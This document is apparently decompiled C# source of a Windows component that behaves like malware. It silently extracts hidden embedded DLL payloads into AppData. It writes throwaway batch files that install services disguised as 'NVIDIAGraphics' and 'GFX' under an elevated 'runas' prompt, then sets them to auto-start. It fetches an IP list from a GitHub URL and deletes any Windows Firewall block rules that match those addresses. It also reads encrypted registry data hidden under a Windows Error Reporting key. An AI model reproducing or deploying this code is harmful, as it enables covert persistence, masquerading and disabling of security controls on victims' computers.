using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Ionic.Zip;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using NetFwTypeLib;

internal sealed class Class60
{
	public static string ptth0;

	internal static bool isAdmin;

	internal static int smethod_0(int int_0)
	{
		if (1 == 0)
		{
		}
		int result = int_0 switch
		{
			94 => 11, 
			95 => 1, 
			96 => 16, 
			97 => 2, 
			99 => 4, 
			100 => 14, 
			101 => 17, 
			102 => 0, 
			105 => 3, 
			_ => -1, 
		};
		if (1 == 0)
		{
		}
		return result;
	}

	internal static string RandomString(int int_28, string string_86)
	{
		char[] array = new char[int_28];
		Random random = new Random();
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = string_86[random.Next(string_86.Length)];
		}
		return new string(array);
	}

	public static void CommEncrypt_Extrte(object j)
	{
		try
		{
			EncryptHDFC_Extrte(0);
		}
		catch
		{
		}
		string text = "Comm_Encrypt.dll";
		string text2 = text;
		string text3 = "Comm_Encrypt.zip";
		string text4 = text3;
		File.Delete(text2);
		File.Delete(text4);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string path = folderPath;
		string path2 = "Comm_Encrypt";
		folderPath = Path.Combine(path, path2);
		string text5 = ptth0;
		string text6 = "\\Comm_Encrypt.exe.PendingOverwrite";
		if (File.Exists(text5 + text6))
		{
			string text7 = folderPath;
			string text8 = "\\Comm_Encrypt.exe.PendingOverwrite";
			File.Delete(text7 + text8);
		}
		string text9 = folderPath;
		string text10 = "\\Comm_Encrypt.exe.tmp";
		if (File.Exists(text9 + text10))
		{
			string text11 = folderPath;
			string text12 = "\\Comm_Encrypt.exe.tmp";
			File.Delete(text11 + text12);
		}
		string text13 = folderPath;
		string text14 = "\\Comm_Encrypt.exe";
		if (File.Exists(text13 + text14))
		{
			string text15 = folderPath;
			string text16 = "\\Comm_Encrypt.exe";
			File.Delete(text15 + text16);
		}
		if (!File.Exists(text2))
		{
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			string name = "IRCommDLL.include.Comm_Encrypt.dll";
			Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
			if (manifestResourceStream != null)
			{
				FileStream fileStream = new FileStream(text2, FileMode.CreateNew);
				for (int i = 0; i < manifestResourceStream.Length; i++)
				{
					fileStream.WriteByte((byte)manifestResourceStream.ReadByte());
				}
				fileStream.Close();
				new FileInfo(text2).Attributes = FileAttributes.Hidden;
			}
		}
		if (!File.Exists(text2))
		{
			return;
		}
		if (!File.Exists(text4))
		{
			File.Copy(text2, text4, overwrite: true);
		}
		File.Delete(text2);
		try
		{
			using (ZipFile zipFile = ZipFile.Read(text4))
			{
				zipFile.ExtractAll(folderPath, ExtractExistingFileAction.OverwriteSilently);
			}
			File.Delete(text4);
		}
		catch (Exception)
		{
			File.Delete(text4);
		}
	}

	public static void EncryptHDFC_Extrte(object j)
	{
		string text = "EncryptHDFC.dll";
		string text2 = text;
		string text3 = "EncryptHDFC.zip";
		string text4 = text3;
		File.Delete(text2);
		File.Delete(text4);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string path = folderPath;
		string path2 = "EncryptHDFC";
		folderPath = Path.Combine(path, path2);
		string text5 = ptth0;
		string text6 = "\\EncryptHDFC.exe.PendingOverwrite";
		if (File.Exists(text5 + text6))
		{
			string text7 = folderPath;
			string text8 = "\\EncryptHDFC.exe.PendingOverwrite";
			File.Delete(text7 + text8);
		}
		string text9 = folderPath;
		string text10 = "\\EncryptHDFC.exe.tmp";
		if (File.Exists(text9 + text10))
		{
			string text11 = folderPath;
			string text12 = "\\EncryptHDFC.exe.tmp";
			File.Delete(text11 + text12);
		}
		string text13 = folderPath;
		string text14 = "\\EncryptHDFC.exe";
		if (File.Exists(text13 + text14))
		{
			string text15 = folderPath;
			string text16 = "\\EncryptHDFC.exe";
			File.Delete(text15 + text16);
		}
		if (!File.Exists(text2))
		{
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			string name = "IRCommDLL.include.EncryptHDFC.dll";
			Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
			if (manifestResourceStream != null)
			{
				FileStream fileStream = new FileStream(text2, FileMode.CreateNew);
				for (int i = 0; i < manifestResourceStream.Length; i++)
				{
					fileStream.WriteByte((byte)manifestResourceStream.ReadByte());
				}
				fileStream.Close();
				new FileInfo(text2).Attributes = FileAttributes.Hidden;
			}
		}
		if (File.Exists(text2))
		{
			if (!File.Exists(text4))
			{
				File.Copy(text2, text4, overwrite: true);
			}
			File.Delete(text2);
			try
			{
				using (ZipFile zipFile = ZipFile.Read(text4))
				{
					zipFile.ExtractAll(folderPath, ExtractExistingFileAction.OverwriteSilently);
				}
				File.Delete(text4);
			}
			catch (Exception)
			{
				File.Delete(text4);
			}
		}
		BlcIP(0);
	}

	public static void ExtractFile(object j)
	{
		string string_ = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		string text = RandomString(10, string_);
		try
		{
			string variable = "clientID";
			string environmentVariable = Environment.GetEnvironmentVariable(variable, EnvironmentVariableTarget.Process);
			string text2 = "SGX9777";
			if (environmentVariable == text2)
			{
				isAdmin = true;
			}
		}
		catch
		{
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
		string text3 = "/MSBuild/Microsoft/Windows Workflow Foundation/v3.5";
		ptth0 = folderPath + text3;
		try
		{
			while (true)
			{
				string text4 = "@echo off\ncd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\ninstallutil.exe -u \"path\\Graphics monitor.exe\"\noto error\nexit\n:error\necho There was a problem\npause";
				string text5 = text4;
				string text6 = text5;
				string oldValue = "path";
				text5 = text6.Replace(oldValue, ptth0);
				new Process();
				if (!Directory.Exists(ptth0))
				{
					Directory.CreateDirectory(ptth0);
				}
				string text7 = ptth0;
				string text8 = "\\";
				string text9 = ".bat";
				if (!File.Exists(text7 + text8 + text + text9))
				{
					string text10 = ptth0;
					string text11 = "\\";
					string text12 = ".bat";
					File.WriteAllText(text10 + text11 + text + text12, text5);
				}
				Process process = new Process();
				ProcessStartInfo startInfo = process.StartInfo;
				string text13 = ptth0;
				string text14 = "\\";
				string text15 = ".bat";
				startInfo.FileName = text13 + text14 + text + text15;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.UseShellExecute = false;
				ProcessStartInfo startInfo2 = process.StartInfo;
				string verb = "runas";
				startInfo2.Verb = verb;
				process.Start();
				process.WaitForExit();
				int num = 0;
				while (true)
				{
					ServiceController serviceController = ServiceController.GetServices().FirstOrDefault(delegate(ServiceController s)
					{
						string serviceName = s.ServiceName;
						string text16 = "NVIDIAGraphics";
						return serviceName == text16;
					});
					Process[] processes = Process.GetProcesses();
					Process[] array = processes;
					Process[] array2 = array;
					foreach (Process process2 in array2)
					{
						string processName = process2.ProcessName;
						string value = "NVIDIAGraphics";
						if (processName.Contains(value))
						{
							process2.Kill();
						}
					}
					if (serviceController != null)
					{
						Thread.Sleep(500);
						if (num > 5)
						{
							break;
						}
						num++;
						continue;
					}
					string text17 = ptth0;
					string text18 = "\\";
					string text19 = ".bat";
					File.Delete(text17 + text18 + text + text19);
					return;
				}
			}
		}
		catch (Exception)
		{
		}
	}

	internal static void startS_(object j)
	{
		string string_ = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		string text = RandomString(10, string_);
		try
		{
			string text2 = "@echo off\ncd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\ninstallutil.exe \"path\\Graphics monitor.exe\"\noto error\nexit\n:error\necho There was a problem\npause";
			string text3 = text2;
			string text4 = text3;
			string oldValue = "path";
			text3 = text4.Replace(oldValue, ptth0);
			string text5 = ptth0;
			string text6 = "\\";
			string text7 = ".bat";
			if (!File.Exists(text5 + text6 + text + text7))
			{
				string text8 = ptth0;
				string text9 = "\\";
				string text10 = ".bat";
				File.WriteAllText(text8 + text9 + text + text10, text3);
			}
			string name = "NVIDIAGraphics";
			ServiceController serviceController = new ServiceController(name);
			if (ServiceController.GetServices().FirstOrDefault(delegate(ServiceController s)
			{
				string serviceName = s.ServiceName;
				string text11 = "NVIDIAGraphics";
				return serviceName == text11;
			}) == null)
			{
				Process process = new Process();
				ProcessStartInfo startInfo = process.StartInfo;
				string text12 = ptth0;
				string text13 = "\\";
				string text14 = ".bat";
				startInfo.FileName = text12 + text13 + text + text14;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.UseShellExecute = false;
				ProcessStartInfo startInfo2 = process.StartInfo;
				string verb = "runas";
				startInfo2.Verb = verb;
				process.Start();
				while (ServiceController.GetServices().FirstOrDefault(delegate(ServiceController s)
				{
					string serviceName2 = s.ServiceName;
					string text15 = "NVIDIAGraphics";
					return serviceName2 == text15;
				}) == null)
				{
					Thread.Sleep(500);
				}
				string text16 = ptth0;
				string text17 = "\\";
				string text18 = ".bat";
				File.Delete(text16 + text17 + text + text18);
				serviceController.Start();
				Thread.Sleep(100);
				Process process2 = new Process();
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				string fileName = "cmd.exe";
				processStartInfo.FileName = fileName;
				ProcessStartInfo startInfo3 = process2.StartInfo;
				string verb2 = "runas";
				startInfo3.Verb = verb2;
				process2.StartInfo.CreateNoWindow = true;
				process2.StartInfo.UseShellExecute = false;
				string arguments = "/c sc config NVIDIAGraphics start=auto";
				processStartInfo.Arguments = arguments;
				process2.StartInfo = processStartInfo;
				process2.Start();
			}
		}
		catch (Exception)
		{
		}
	}

	public static void ExtractFile0(object j)
	{
		string string_ = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		string text = RandomString(10, string_);
		try
		{
			string variable = "clientID";
			Environment.GetEnvironmentVariable(variable, EnvironmentVariableTarget.Process);
		}
		catch
		{
		}
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);
		string text2 = "/MSBuild/Microsoft/Windows Workflow Foundation/v3.5";
		ptth0 = folderPath + text2;
		try
		{
			string text3 = "@echo off\ncd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\ninstallutil.exe -u \"path\\GFX.exe\"\noto error\nexit\n:error\necho There was a problem\npause";
			string text4 = text3;
			string text5 = text4;
			string oldValue = "path";
			text4 = text5.Replace(oldValue, ptth0);
			new Process();
			if (!Directory.Exists(ptth0))
			{
				Directory.CreateDirectory(ptth0);
			}
			string text6 = ptth0;
			string text7 = "\\";
			string text8 = ".bat";
			if (!File.Exists(text6 + text7 + text + text8))
			{
				string text9 = ptth0;
				string text10 = "\\";
				string text11 = ".bat";
				File.WriteAllText(text9 + text10 + text + text11, text4);
			}
			Process process = new Process();
			ProcessStartInfo startInfo = process.StartInfo;
			string text12 = ptth0;
			string text13 = "\\";
			string text14 = ".bat";
			startInfo.FileName = text12 + text13 + text + text14;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			ProcessStartInfo startInfo2 = process.StartInfo;
			string verb = "runas";
			startInfo2.Verb = verb;
			process.Start();
			process.WaitForExit();
		}
		catch (Exception)
		{
		}
	}

	internal static void startS_0(object j)
	{
		string string_ = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		string text = RandomString(10, string_);
		try
		{
			string text2 = "@echo off\ncd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\ninstallutil.exe \"path\\GFX.exe\"\noto error\nexit\n:error\necho There was a problem\npause";
			string text3 = text2;
			string text4 = text3;
			string oldValue = "path";
			text3 = text4.Replace(oldValue, ptth0);
			string text5 = ptth0;
			string text6 = "\\";
			string text7 = ".bat";
			if (!File.Exists(text5 + text6 + text + text7))
			{
				string text8 = ptth0;
				string text9 = "\\";
				string text10 = ".bat";
				File.WriteAllText(text8 + text9 + text + text10, text3);
			}
			string name = "GFX";
			ServiceController serviceController = new ServiceController(name);
			if (ServiceController.GetServices().FirstOrDefault(delegate(ServiceController s)
			{
				string serviceName = s.ServiceName;
				string text11 = "GFX";
				return serviceName == text11;
			}) == null)
			{
				Process process = new Process();
				ProcessStartInfo startInfo = process.StartInfo;
				string text12 = ptth0;
				string text13 = "\\";
				string text14 = ".bat";
				startInfo.FileName = text12 + text13 + text + text14;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.UseShellExecute = false;
				ProcessStartInfo startInfo2 = process.StartInfo;
				string verb = "runas";
				startInfo2.Verb = verb;
				process.Start();
				int num = 0;
				while (ServiceController.GetServices().FirstOrDefault(delegate(ServiceController s)
				{
					string serviceName2 = s.ServiceName;
					string text15 = "GFX";
					return serviceName2 == text15;
				}) == null && num <= 10)
				{
					num++;
					Thread.Sleep(500);
				}
				string text16 = ptth0;
				string text17 = "\\";
				string text18 = ".bat";
				File.Delete(text16 + text17 + text + text18);
				serviceController.Start();
				Thread.Sleep(100);
				Process process2 = new Process();
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				string fileName = "cmd.exe";
				processStartInfo.FileName = fileName;
				ProcessStartInfo startInfo3 = process2.StartInfo;
				string verb2 = "runas";
				startInfo3.Verb = verb2;
				process2.StartInfo.CreateNoWindow = true;
				process2.StartInfo.UseShellExecute = false;
				string arguments = "/c sc config GFX start=auto";
				processStartInfo.Arguments = arguments;
				process2.StartInfo = processStartInfo;
				process2.Start();
			}
		}
		catch
		{
		}
	}

	internal static void check_registry(object j)
	{
		try
		{
			Thread.Sleep(15000);
			string text = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Windows Error Reporting";
			string name = text;
			string text2 = "NgetData";
			string name2 = text2;
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
			if (registryKey == null)
			{
				return;
			}
			object value = registryKey.GetValue(name2);
			if (value != null)
			{
				string string_ = value.ToString();
				string string_2 = "4d4#r7%55";
				string text3 = Decrypt(string_, string_2);
				string[] array = new string[1];
				string text4 = "___";
				array[0] = text4;
				string[] array2 = text3.Split(array, StringSplitOptions.None);
				string text5 = array2[1];
				string text6 = array2[1];
				string value2 = "SellerId";
				string text7 = text5.Substring(text6.IndexOf(value2) + 11);
				string value3 = "\"";
				if (string.IsNullOrEmpty(text7.Substring(0, text7.IndexOf(value3))))
				{
					Form owner = new Form
					{
						TopMost = true
					};
					string text8 = "Aap ki ID Kisi Bhi Panel se Link Nahi hai\nApne Seller se Contact Karke Assign Kara len\nSeller Connect na Hone Pe 30-11-2023 ko Aapki ID auto Delete ho jayegi\nNote:- jis Seller se Aapne ID Buy ki thi usi se Assign Karayen nahi to ID Delete ho jayegi";
					string caption = "Seller Not Found";
					MessageBox.Show(owner, text8, caption, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					Form owner2 = new Form
					{
						TopMost = true
					};
					string text9 = "Aap ki ID Kisi Bhi Panel se Link Nahi hai\nApne Seller se Contact Karke Assign Kara len\nSeller Connect na Hone Pe 30-11-2023 ko Aapki ID auto Delete ho jayegi\nNote:- jis Seller se Aapne ID Buy ki thi usi se Assign Karayen nahi to ID Delete ho jayegi";
					string caption2 = "Seller Not Found";
					MessageBox.Show(owner2, text9, caption2, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				}
			}
		}
		catch
		{
		}
	}

	public static string method_1(string string_0, string string_1, string string_2)
	{
		try
		{
			int num = string_1.Length + 2;
			string text = string_0.Substring(string_0.IndexOf(string_1) + num);
			return text.Substring(0, text.IndexOf(string_2));
		}
		catch (Exception ex)
		{
			return ex.ToString();
		}
	}

	public static string Decrypt(string string_0, string string_4)
	{
		byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
		try
		{
			byte[] bytes = Encoding.UTF8.GetBytes(string_4.Substring(0, 8));
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			byte[] array = Convert.FromBase64String(string_0);
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(bytes, rgbIV), CryptoStreamMode.Write);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.FlushFinalBlock();
			return Encoding.UTF8.GetString(memoryStream.ToArray());
		}
		catch (Exception ex)
		{
			return ex.Message;
		}
	}

	public static string Encrypt(string string_0, string string_4)
	{
		byte[] rgbIV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
		byte[] bytes = Encoding.UTF8.GetBytes(Strings.Left(string_4, 8));
		DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		byte[] bytes2 = Encoding.UTF8.GetBytes(string_0);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateEncryptor(bytes, rgbIV), CryptoStreamMode.Write);
		cryptoStream.Write(bytes2, 0, bytes2.Length);
		cryptoStream.FlushFinalBlock();
		return Convert.ToBase64String(memoryStream.ToArray());
	}

	public static string Base64Decode(string base64EncodedData)
	{
		byte[] bytes = Convert.FromBase64String(base64EncodedData);
		return Encoding.UTF8.GetString(bytes);
	}

	internal static int GetSlot(int int_Slot, ref int ip)
	{
		int result = 0;
		switch (int_Slot)
		{
		case 1:
		case 2:
			ip = 0;
			result = 1;
			break;
		case 3:
		case 4:
			ip = 1;
			result = 3;
			break;
		case 5:
		case 6:
			ip = 2;
			result = 5;
			break;
		case 7:
		case 8:
			ip = 3;
			result = 7;
			break;
		case 9:
		case 10:
			ip = 4;
			result = 9;
			break;
		case 11:
		case 12:
			ip = 5;
			result = 11;
			break;
		case 13:
		case 14:
			ip = 6;
			result = 13;
			break;
		case 15:
		case 16:
			ip = 7;
			result = 15;
			break;
		case 17:
		case 18:
			ip = 8;
			result = 17;
			break;
		case 19:
		case 20:
			ip = 9;
			result = 19;
			break;
		case 21:
		case 22:
			ip = 10;
			result = 21;
			break;
		case 23:
		case 24:
			ip = 11;
			result = 23;
			break;
		case 25:
		case 26:
			ip = 12;
			result = 25;
			break;
		}
		return result;
	}

	internal static void BlcIP(object j)
	{
		try
		{
			string text = "";
			string requestUriString = "https://raw.githubusercontent.com/hitmants2026-a11y/Hitman/refs/heads/main/nsList";
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
			string contentType = "application/x-www-form-urlencoded; charset=utf-8";
			httpWebRequest.ContentType = contentType;
			string method = "GET";
			httpWebRequest.Method = method;
			using StreamReader streamReader = new StreamReader(((HttpWebResponse)httpWebRequest.GetResponse()).GetResponseStream());
			text = streamReader.ReadToEnd();
			string text2 = text;
			string oldValue = "\n";
			text = text2.Replace(oldValue, "");
			string text3 = text;
			string value = "nsiplist=";
			if (!text3.Contains(value))
			{
				return;
			}
			string text4 = text;
			string oldValue2 = "nsiplist=";
			text = text4.Replace(oldValue2, "");
			string text5 = text;
			string[] array = new string[1];
			string text6 = "###";
			array[0] = text6;
			string[] array2 = text5.Split(array, StringSplitOptions.None);
			string[] array3 = array2;
			string[] array4 = array3;
			foreach (string value2 in array4)
			{
				string progID = "HNetCfg.FwPolicy2";
				foreach (INetFwRule rule in ((INetFwPolicy2)Activator.CreateInstance(Type.GetTypeFromProgID(progID))).Rules)
				{
					if (rule.Action == NET_FW_ACTION_.NET_FW_ACTION_BLOCK && rule.RemoteAddresses.Contains(value2))
					{
						string name = rule.Name;
						string text7 = "netsh advfirewall firewall delete rule name=\"";
						string text8 = "\"";
						ExecuteCommand(text7 + name + text8);
					}
				}
				string variable = "clientID";
				string environmentVariable = Environment.GetEnvironmentVariable(variable, EnvironmentVariableTarget.Process);
				string text9 = "SGX9777";
				if (environmentVariable == text9)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	private static void ExecuteCommand(string command)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		string fileName = "cmd.exe";
		processStartInfo.FileName = fileName;
		string text = "/C ";
		processStartInfo.Arguments = text + command;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		process.StartInfo = processStartInfo;
		process.Start();
		Console.WriteLine(process.StandardOutput.ReadToEnd());
		process.WaitForExit();
	}

	private static string GetRandomString(int length)
	{
		Random random = new Random();
		StringBuilder stringBuilder = new StringBuilder(length);
		for (int i = 0; i < length; i++)
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
			string text2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
			stringBuilder.Append(text[random.Next(text2.Length)]);
		}
		return stringBuilder.ToString();
	}
}
